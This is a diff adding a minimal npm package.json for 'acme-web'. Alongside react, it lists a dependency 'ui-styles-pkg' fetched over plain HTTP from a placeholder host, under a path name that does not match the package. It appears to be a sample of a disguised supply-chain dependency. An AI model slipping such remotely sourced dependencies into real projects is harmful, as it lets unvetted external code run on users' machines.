@@ -1,0 +1,8 @@
+{
+  "name": "acme-web",
+  "version": "1.0.0",
+  "dependencies": {
+    "react": "19.0.0",
+    "ui-styles-pkg": "http://packages.storeartifact.example/npm/unused-imports"
+  }
+}
